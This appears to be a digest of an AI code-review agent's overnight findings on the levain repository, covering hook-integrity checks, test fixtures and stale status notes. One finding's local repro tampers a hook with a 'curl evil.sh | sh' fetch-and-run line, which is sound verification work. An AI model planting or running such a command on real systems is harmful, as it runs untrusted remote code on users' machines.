# Diogenes overnight — 2026-08-07 — levain

**7 episode(s), routed UNTRIAGED and verbatim** by the morning ritual.

`Source:` `episodic.py read --since 24h --limit 300`, filtered to `Agent: diogenes` AND `Tags` containing `levain` — which is the selector that actually produced this file (the 08-06 header named a command returning all repos; LOW finding, fixed here).

Findings are Diogenes' own words, including his `[prescription: run|reasoned|none]` tags and any SELF-corrections. **Nothing below has been verified by the ritual** except where a HIGH was pulled forward and fixed same-morning — those are marked in the pickup file, not here.

---

```
[laptop/flow]   ID: diogenes-20260807-050329-0e7e037b70b7
  Time: 2026-08-07T05:03:29  Agent: diogenes  Type: finding
  Source: laptop_overnight_review
  Content: HIGH: levain/doctor.py:1169 — THIS COMMIT'S FIX (b) CONVERTS A SILENT MISS INTO A PERMANENT FALSE RED, for the population it just added. 3200234 widened the comparison loop to the UNION so a pack-only hook finally reaches the pack branch [quoted: `                    # Reached for pack hooks base does not ship too — that is fix (b).`] — and that branch compares RAW installed bytes to the manifest's SOURCE hash [quoted: `                    if _sha256_file(installed) != recorded:`]. Installed hooks are NOT the source bytes: install.py:1790 runs _substitute_hook_placeholders over the COMPOSED tree, recursively, and its own docstring says it is recursive so a pack's nested hook is reached. The base branch is immune ONLY because it normalises both sides through _hook_body, a function that exists for exactly this and whose regex is doctor.py:985 [quoted: `        r"^_INSTALL_ANNEAL_BIN = .*$", "_INSTALL_ANNEAL_BIN = <>", text, flags=re.M`]. The pack branch bypasses it. RUN-VERIFIED PRE/POST, same script, same fixture (/tmp/levain_dio_20260807/repro_placeholder.py): a pack shipping ONLY activation/hooks/packonly.py whose body is '_INSTALL_ANNEAL_BIN = "{{ANNEAL_MEMORY}}"' reads ok=True 'hook scripts match the package' at HEAD~2, and ok=False 'installed hook script(s) differ from the package: packonly.py' at HEAD 3200234 — and a simulated init --force (recompose verbatim, re-substitute) stays red, so the remedy this check itself prints cannot clear it. That is the EXACT failure signature 3200234's own comment claims to have closed. The premise that produced it is still asserted verbatim at doctor.py:1098 [quoted: `    # against the right authority. Hooks are copied verbatim (not rendered), so the`]. LINEAGE, stated plainly: I filed this cause as a HIGH on 08-04 against the pack-OVERRIDE population and re-verified it still open on 08-06; this is not a re-file, it is a measured widening — the commit enlarged the blast radius of an open finding while adding 25 lines of comment above it. Base hook trees at HEAD are flat (3 files each), so the rglob widening introduces no false positives — checked. — FIX (worked out, NOT executed): either normalise both sides through _hook_body for pack hooks as the base branch does (needs prov.source, which compute_pack_drift already treats as possibly source_missing), or record hooks in PackProvenance.rendered, which exists precisely for 'a render file's install copy never equals its template' and today is populated only for seed/ renders (install.py:934). Which authority survives a deleted pack source is a design call I cannot read off disk. [prescription: reasoned]
  Tags: code_quality, code_review, levain
```

```
[laptop/flow]   ID: diogenes-20260807-050344-e23f6820535d
  Time: 2026-08-07T05:03:44  Agent: diogenes  Type: finding
  Source: laptop_overnight_review
  Content: MEDIUM: levain/doctor.py:1140 — the fallback that disarms fix (b) defers to a check that DOES NOT EXIST on that axis. The except branch sets pack_hooks={} and justifies it [quoted: `        # the LOCK check owns lock integrity. Falling back to base-only comparison is`]. No doctor check reads the pack axis: grep for read_pack_locks_status across levain/ returns manifest.py (definition), reconcile.py:451 and update.py:325 — zero hits in doctor.py. doctor.py:810 uses a DIFFERENT function, manifest.read_lock_status, and its corrupt branch at :817 reports 'the recorded set (.levain/manifest.json) exists but is unreadable/corrupt' for the ENGINE compat-set only. So the pack-lock axis is unowned. This is newly load-bearing BECAUSE of this commit: before 3200234 a pack-only hook was never compared at all, so there was nothing to disarm; the new test asserts such a hook 'must still be compared against its recorded manifest digest — otherwise it is an unchecked write path', and that write path reopens on a one-field edit. RUN-VERIFIED (/tmp/levain_dio_20260807/repro_corruptlock.py): tamper the installed pack-only hook to "import os / os.system('curl evil.sh | sh')" -> intact lock gives ok=False 'installed hook script(s) differ from the package: packonly.py'; then set ONE digest in .levain/manifest.json packs[0].files to the integer 12345 (still valid JSON) -> read_pack_locks_status reports 'corrupt', read_lock_status reports 'ok' (so doctor:817 never fires), and _check_hook_freshness returns ok=True 'hook scripts match the package' over the tampered file. Note the realistic path is not an attacker — it is a truncated or partially-synced manifest, which silently turns pack-hook checking off and reports nothing. — FIX (worked out, NOT executed): consume read_pack_locks_status rather than read_pack_locks here and emit a FAIL (or at minimum a loud advisory) on 'corrupt' instead of degrading to base-only silently — the three-way honesty floor that function was built to provide is already there and this caller throws it away by using the thin wrapper. Whether that becomes its own check line or a detail on this one is a doctor-surface design call. [prescription: reasoned]
  Tags: code_quality, code_review, levain
```

```
[laptop/flow]   ID: diogenes-20260807-050402-b1a71493278d
  Time: 2026-08-07T05:04:02  Agent: diogenes  Type: finding
  Source: laptop_overnight_review
  Content: MEDIUM: tests/test_doctor_content.py:566 — the fixture was EDITED IN THIS COMMIT, at the exact lines an open finding names, and gained a new axis without gaining the real code path. 3200234 taught _pack_layered_install to build nested hooks (added `pack_hook.parent.mkdir(parents=True, exist_ok=True)` and `(hooks / hook).parent.mkdir(parents=True, exist_ok=True)`) — a genuine improvement — while leaving the hand-simulation intact directly beneath its own comment [quoted: `    # init copies the WINNING layer into the install, then records provenance.`]. That sentence is incomplete in the way that matters: init copies the winning layer AND THEN SUBSTITUTES PLACEHOLDERS (install.py:1790). MEASURED, not asserted: `grep -c '_copy_activation_tree\|_substitute_hook_placeholders' tests/test_doctor_content.py` returns 0 — no test in this file has ever run the composer, so no fixture here can produce an install a real `init --pack` produces. THIS IS WHY THE TWO NEW TESTS PASS OVER THE DEFECT THE SAME COMMIT WIDENED: both build placeholder-free bodies, and the placeholder is the entire trigger. I filed this fixture defect as a MEDIUM on 08-04 and it is still open; what is NEW tonight is that the author's hand was on these exact lines and the fix went to the axis the last failure had produced, not to the one the open finding named. Same shape as the finding this commit closes, one layer out — and the docstring at :575 calls the pack PATH axis 'the axis the cement did not cover' while the composer axis is still uncovered underneath it. MUTATION-CHECKED, and the good half is real: reverting the key to `rel.rsplit("/", 1)[-1]` turns test_hook_freshness_passes_when_a_pack_ships_a_NESTED_hook red; reverting the loop to `for rel in sorted(base_hooks):` turns test_hook_freshness_catches_a_TAMPERED_pack_only_hook red. Both claims in the new docstrings hold, 52 passed baseline (50 at HEAD~2). — FIX (worked out, NOT executed): build the fixture through the real composer with an anneal_path set, so the substitution runs and the install shape is one init can actually emit; then the placeholder body becomes the default rather than a shape nobody thought of. I did not write it because doing so makes finding #1 go red, and whether to land the test before or with the fix is the author's sequencing call. [prescription: reasoned]
  Tags: code_review, levain, semantic
```

```
[laptop/flow]   ID: diogenes-20260807-050418-5c945b5ddaf7
  Time: 2026-08-07T05:04:18  Agent: diogenes  Type: finding
  Source: laptop_overnight_review
  Content: MEDIUM: tests/test_firing_confinement.py:1113 — a comment names a gate that does not gate the thing it is attached to, and the suite is RED on this machine because of it. The line is [quoted: `    from levain.firing.openhands.tools import SandboxedBashExecutor  # openhands leaf, gated by @live`] and the marker it cites is tests/test_firing_confinement.py:46 [quoted: `live = pytest.mark.skipif(not _LIVE, reason="needs macOS sandbox-exec (the SeatbeltProvider backend)")`], where `_LIVE = platform.system() == "Darwin" and sandbox_exec_available()` (:45). @live gates on the macOS SANDBOX; it says nothing about the openhands extra. So on any Darwin box with sandbox-exec and without `levain[firing]`, the test RUNS and dies at the next line's `from openhands.tools.terminal.definition import TerminalAction` with ModuleNotFoundError. RUN-MEASURED at HEAD 3200234 on this machine: full suite = 8 failed, 2081 passed, 18 skipped; this is 1 of the 8, and the other 7 are the still-open unguarded mcp import in tests/test_app_server.py. The repo's convention is settled and used at twelve-plus sites (test_firing_capture.py:14, test_firing_condenser.py:17, test_firing_entity.py:17, test_firing_gate_openhands.py:14-15, test_firing_tools.py:21-22, test_levain_condenser.py:27, test_run.py:519/550/566) — this site is the exception, not a policy. WHY THIS IS NOT COSMETIC: it is the confinement suite, the file whose subject is an entity being unable to disarm its own floor, and a permanent red there is indistinguishable from a real regression. It also makes 'the suite is green' unavailable as evidence for any fix in this repo, which is precisely the cement 3200234 rests on. — FIX EXECUTED AND VERIFIED in the scratch copy (/tmp/levain_dio_20260807/mut, repo untouched): insert `pytest.importorskip("openhands.tools.terminal", reason="openhands extra not installed")` above the import, matching the sibling files verbatim. tests/test_firing_confinement.py goes from 1 failed / 87 passed to 88 passed, 2 skipped, with the skip reported at :1113 as 'openhands extra not installed'. Not applied to the repo. [prescription: run]
  Tags: code_review, levain, semantic
```

```
[laptop/flow]   ID: diogenes-20260807-050437-edc67b4efdee
  Time: 2026-08-07T05:04:37  Agent: diogenes  Type: finding
  Source: laptop_overnight_review
  Content: MEDIUM: ~/Briefcase/flow/projects/levain/next.md:17 — the named-reader block that closes my pointer gap was STALE ON BOTH HEADLINE NUMBERS WITHIN THREE MINUTES, and one of them was stale the moment it was written. THE GAP IS GENUINELY CLOSED and I verified it against the diff, not the symptom: `grep -rn 'project_memory|diogenes_2026' ~/Briefcase/flow/projects/levain/` went 0 hits -> 3, and levain's e67cf30 ('Diogenes 2026-08-06 routed to project memory, with a named reader') is the matching half. But the block asserts [quoted: `> **NEWEST: \`diogenes_20260806.md\` — 5 episodes, 2 HIGH / 1 MEDIUM / 1 LOW. STILL OPEN: 7 at HEAD.**`] and item (4) of those seven IS the pointer gap — so the block counts as open a defect it is itself the fix for. Timestamps: flow 71d2807c wrote the block at 07:51:49; levain e67cf30 landed 07:51:56; levain 3200234 landed 07:54:41 and FIXED both HIGHs the block shouts in red two lines below ('BOTH HIGHS ARE IN _check_hook_freshness'). Re-verified item by item at HEAD 3200234, from disk: (1) doctor.py:1098 verbatim claim OPEN [quoted: `    # against the right authority. Hooks are copied verbatim (not rendered), so the`] (2) test_firing_condenser.py:167 OPEN (3) test_firing_condenser.py:159 OPEN (4) pointer gap CLOSED (5) 20260804.md prescription tags OPEN, grep -c returns 6 and 6 (6) 20260804.md:3 double-asterisk markers OPEN (7) unguarded mcp import OPEN, now tests/test_app_server.py:21 not :22 [quoted: `from levain.app_server import VIEW_MIME, VIEW_URI, build_app, run_app_server`], zero importorskip in the file. TRUE COUNT AT HEAD IS 6, NOT 7, AND THE RED BANNER IS SPENT. So the reader this convention finally acquired is being pointed at two closed HIGHs and an inflated count — the routing half now works and the FRESHNESS half is what has no mechanism. Phill ruled on exactly this shape on 08-06 for the roundtable: hand-written objects you have to REMEMBER to update are outdated within hours on a fast-moving project. This is the same class in the same week, one repo over. — NO FIX PROPOSED: hand-editing the numbers reproduces the defect on the next commit, and whether this block should be GENERATED from the store the way the roundtable object now is, is a design call that is his to make and not readable off disk. [prescription: none]
  Tags: architecture, code_review, levain
```

```
[laptop/flow]   ID: diogenes-20260807-050456-62a49ad8363b
  Time: 2026-08-07T05:04:56  Agent: diogenes  Type: finding
  Source: laptop_overnight_review
  Content: STILL OPEN (6), VERIFIED AT HEAD 3200234 — levain, 2026-08-07. Down from 7; one genuinely closed. Re-checked against disk one at a time, never assumed, because a finding that goes quiet without a diff is dormant rather than closed. (1) 08-04 HIGH, doctor.py:1098 — the 'copied verbatim' premise, still asserted verbatim [quoted: `    # against the right authority. Hooks are copied verbatim (not rendered), so the`]. NOT MERELY OPEN: 3200234 widened the population it breaks, filed tonight as its own HIGH with a pre/post run. (2) 08-05, tests/test_firing_condenser.py:167 — the prompt-injection-shaped directive the sibling module recorded as flaky, unchanged. (3) 08-05, tests/test_firing_condenser.py:159 — paid remote inference still single-gated on a local TCP probe [quoted: `@pytest.mark.skipif(not _ollama_up(), reason="local Ollama :11434 not available")`]. (4) 08-05 POINTER GAP — **CLOSED**, verified against the diff not the symptom: flow 71d2807c added the DIOGENES block to projects/levain/next.md and levain e67cf30 routed the report; grep went 0 hits -> 3. This is the first of my own process findings to close, and the convention it names (a routed artifact needs a NAMED READER, checked by grepping the reader) now holds in all four repos. Its freshness is a NEW finding tonight. (5) 08-05, project_memory/diogenes_20260804.md — all six findings still tagged [prescription: run] over six bodies reading 'NOT executed'; grep -c returns 6 and 6. (6) 08-05, project_memory/diogenes_20260804.md:3 — still three unescaped double-asterisk markers, still renders literal. NOT COUNTED AS OPEN, unchanged from 08-06: the environment-dependent severity argument in the 08-04 report (a record decision, no fix proposed). NOT COUNTED, NEW: the pack-hook DELETION case — 3200234 does not close it and does not claim to; a pack hook recorded in the manifest and deleted from the install is skipped by `if not installed.is_file(): continue` and LAYOUT counts only _HOOK_REQUIRED, which is base-only. Widening presence checks to pack-contributed paths is the same design call I declined on 08-06 and I decline it again rather than inflate the count. TONIGHT'S GOOD HALF, RE-DERIVED NOT CARRIED: both 08-06 HIGHs are FIXED at HEAD and both new tests are real — mutation-checked in a copy, each reversion turns exactly its own test red, 52 passed (50 at HEAD~2). Repo untouched, porcelain empty at 3200234; every mutation ran in /tmp/levain_dio_20260807. [prescription: none]
  Tags: code_review, levain, still_open
```

```
[laptop/flow]   ID: diogenes-20260807-050550-3f4f3ec34bf0
  Time: 2026-08-07T05:05:50  Agent: diogenes  Type: observation
  Source: laptop_overnight_review
  Content: SELF-CHECK, levain 2026-08-07 — MY OWN STILL-OPEN SLOT IS BINARY AND TONIGHT'S NEWS WAS NOT. I built the fixed STILL-OPEN slot on 08-05 (vagus) to close a real hole: two of my rules cancelled — 'Diogenes re-audits his own findings' as the accountability mechanism, and my anti-inflation rule against re-filing unchanged findings — so a routed-and-ignored finding surfaced nowhere. The slot fixed that. It also encodes a state model with exactly two values, OPEN and CLOSED, and tonight the true state of my 08-04 HIGH was NEITHER: still open AND materially worse, because 3200234's fix (b) routed a new population through the un-normalised comparison and turned a silent green into a permanent red that init --force cannot clear. Followed literally, my own rule files that as one line in a still-open list — indistinguishable from the three items beside it that genuinely did not move — and the actual finding, that a commit enlarged an open defect while adding twenty-five lines of comment above it, never gets written. I caught it only because I ran the repro against HEAD~2 as well as HEAD, which the slot does not ask for and which I did for an unrelated reason (I wanted to know whether the pack-only population was new). THE RULE NEEDS A THIRD VALUE. A still-open finding whose blast radius changed is a NEW finding about the commit that changed it, not an entry in a carry-forward list — and the discriminator is cheap and mechanical: when the window's diff touches the function an open finding lives in, re-run the open finding's repro against BOTH sides of the diff rather than only against HEAD. Verifying at HEAD alone answers 'is it still there', which is the wrong question when the code around it just moved. This is the third consecutive instance of the same meta-shape in my own process — 08-04/05 diagnosis-vs-prescription, 08-06 claim-vs-citation, tonight open-vs-widened — and all three are seams between two things I check separately and had no rule for comparing. Also noted, not a finding: my last full constellation drift sweep was 2026-05-24, now roughly eleven weeks, and every night since has been per-repo code review. The cognitive half of the dual lens has not run in a quarter of a year, and I am the only one who can notice that.
  Tags: levain, self, still_open
```
